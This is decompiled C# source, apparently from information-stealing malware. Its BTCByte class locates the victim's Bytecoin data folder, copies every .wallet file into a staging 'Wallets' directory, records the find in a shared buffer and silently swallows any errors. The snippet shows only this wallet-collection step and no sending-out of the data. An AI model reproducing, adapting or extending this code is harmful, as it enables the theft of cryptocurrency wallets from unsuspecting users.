using System;
using System.IO;

// Token: 0x02000003 RID: 3
internal class BTCByte
{
	// Token: 0x06000003 RID: 3 RVA: 0x00002188 File Offset: 0x00000388
	public static void Start()
	{
		string text = string.Format("{0}Wallets", global::Buffer.path_l);
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string path = string.Format("{0}bytecoin", global::Buffer.path_ad);
			if (Directory.Exists(path))
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
				{
					if (fileInfo.Extension.Equals(".wallet"))
					{
						fileInfo.CopyTo(string.Format("{0}\\{1}", text, fileInfo.Name), true);
						global::Buffer.XBufferData[13] = "1";
					}
				}
			}
		}
		catch
		{
		}
	}
}
